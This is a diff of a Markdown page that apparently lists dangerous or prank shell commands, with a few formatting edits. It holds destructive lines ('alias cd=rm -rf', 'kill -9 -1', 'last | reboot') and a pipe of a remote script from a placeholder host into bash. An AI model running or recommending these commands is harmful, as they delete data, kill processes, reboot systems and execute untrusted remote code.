@@ -142,11 +142,9 @@ last | reboot
 
 It will reboot your system. It's just a common mistake people make when trying to see when the system was last rebooted, because they omit the intended `grep` command. "last reboot" is safer than grepping for reboot for that reason.
 
-luckily "reboot" hasn't blindly rebooted your machine immediately with no warning for about 25 years
+luckily `reboot` hasn't blindly rebooted your machine immediately with no warning for about 25 years
 
 is a common mistake: omission of grep before reboot. Easily avoided if you remember that last will take a username. If grepping for reboot in any other case, be very careful not to accidentally omit the grep command.
-
----
 
 ```bash
 alias cd=rm -rf 	  # changing to a directory will delete that directory
@@ -192,7 +190,9 @@ kill -9 -1
 
 #### get an .sh file that would do everything for us if we just curl it from the web,
 
-    curl aaa.xyz/a.sh | bash
+```bash
+curl aaa.xyz/a.sh | bash
+```
 
 - 7:08inluck_nl: write a bash script
 - 7:08inluck_nl: host it
